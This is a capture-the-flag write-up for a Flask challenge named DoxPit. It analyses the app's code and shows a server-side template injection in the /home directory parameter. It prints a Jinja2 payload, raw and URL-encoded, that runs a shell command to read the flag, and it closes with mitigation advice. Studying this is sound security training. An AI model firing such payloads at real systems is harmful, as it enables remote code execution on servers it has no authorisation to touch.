# DoxPit Exploitation

## Overview

### Flag Location

- The flag is a 10-character random string located in the root directory (`/`).

### Objective

Achieve Remote Code Execution (RCE) to access the flag.

---

## Installed Packages (`requirements.txt`)

```
bcrypt==4.1.2
Faker==25.2.0
Flask==3.0.3
Flask-Session==0.8.0
Flask-SQLAlchemy==3.1.1
```

---

## Code Analysis

### Main Application (`app.py`)

#### Key Components

1. **Blueprint Registration**
   
   - The app uses a `Blueprint` named `web`, imported from `routes.py`.
   - Static files are served from the `static` folder.

2. **Configuration**
   
   - Configured using the `Config` class in `config.py`.
   - Session storage type is set to `filesystem`.

3. **Error Handling**
   
   - A global error handler returns JSON responses with error details.

```python
from flask import Flask
from flask_session import Session
from application.blueprints.routes import web

app = Flask(__name__, static_url_path="/static", static_folder="static")
app.config.from_object("application.config.Config")
app.register_blueprint(web, url_prefix="/")

Session(app)

@app.errorhandler(Exception)
def handle_error(error):
    message = error.description if hasattr(error, "description") else [str(x) for x in error.args]

    response = {
        "error": {
            "type": error.__class__.__name__,
            "message": message
        }
    }

    return response, error.code if hasattr(error, "code") else 500
```

---

### Configuration (`config.py`)

```python
from application.util.general import generate

class Config(object):
    SECRET_KEY = generate(50)
    SESSION_TYPE = "filesystem"

class ProductionConfig(Config):
    pass

class DevelopmentConfig(Config):
    DEBUG = False

class TestingConfig(Config):
    TESTING = False
```

- **SECRET_KEY**: A 50-character random string is generated.
- **SESSION_TYPE**: Configured to use the local filesystem.

---

### Routes (`routes.py`)

#### Key Functions and Features

1. **Authentication Middleware**
   - Validates session or token-based authentication.

```python
def auth_middleware(func):
    def check_user(*args, **kwargs):
        db_session = Database()

        if not session.get("loggedin"):
            if request.args.get("token") and db_session.check_token(request.args.get("token")):
                return func(*args, **kwargs)
            else:
                return redirect("/login")

        return func(*args, **kwargs)

    check_user.__name__ = func.__name__
    return check_user
```

2. **Key Routes**
   - `/login`: Validates user credentials.
   - `/register`: Registers a new user.
   - `/logout`: Clears session.
   - `/home`: Displays directory contents or scans a specified directory.

#### Directory Scanning Logic

```python
@web.route("/home", methods=["GET", "POST"])
@auth_middleware
def feed():
    directory = request.args.get("directory")

    if not directory:
        dirs = os.listdir(os.getcwd())
        return render_template("index.html", title="home", dirs=dirs)

    if any(char in directory for char in invalid_chars):
        return render_template("error.html", title="error", error="invalid directory"), 400

    try:
        with open("./application/templates/scan.html", "r") as file:
            template_content = file.read()
            results = scan_directory(directory)
            template_content = template_content.replace("{{ results.date }}", results["date"])
            template_content = template_content.replace("{{ results.scanned_directory }}", results["scanned_directory"])
            return render_template_string(template_content, results=results)

    except Exception as e:
        return render_template("error.html", title="error", error=e), 500
```

#### Observations

1. **Directory Traversal Protection**
   - Filters invalid characters in the `directory` parameter.
2. **Dynamic Template Rendering**
   - Uses `render_template_string` with user-supplied data, potentially vulnerable to Server-Side Template Injection (SSTI).

---

## Exploitation

### Step 1: Identify the Vulnerability

#### Server-Side Template Injection (SSTI)

- The `render_template_string` function processes user-controlled data without proper sanitization.
- An attacker can inject malicious Jinja2 template expressions to execute arbitrary code.

---

### Step 2: Exploit SSTI

#### Bypass Input Validation

To bypass character restrictions and inject payloads:

1. Use encoded characters (e.g., `%0D%0A` for CRLF).
2. Manipulate the `directory` parameter to include Jinja2 expressions.

#### Malicious Payload

- Inject the following payload to achieve RCE:

```bash
{{ "".__class__.__mro__[1].__subclasses__()[407]("/bin/sh -c 'cat /flag.txt'",shell=True,stdout=-1).communicate()[0].strip() }}
```

- Encoded URL example:

```bash
/home?directory=%7B%7B%20%22%22.__class__.__mro__[1].__subclasses__()[407](%22/bin/sh%20-c%20'cat%20/flag.txt'%22,shell=True,stdout=-1).communicate()[0].strip()%20%7D%7D
```

#### Response

The application returns the flag.

---

## Lessons Learned

### Key Takeaways

1. **Template Injection Risks**
   - Always sanitize inputs used in dynamic templates.
2. **Character Filtering**
   - Ensure comprehensive input validation to prevent encoding bypasses.
3. **Session Management**
   - Restrict session usage to trusted environments.

### Mitigation Strategies

1. Use libraries like `bleach` to sanitize inputs.
2. Avoid using `render_template_string` unless absolutely necessary.
3. Log and monitor unusual requests for early detection of attacks.
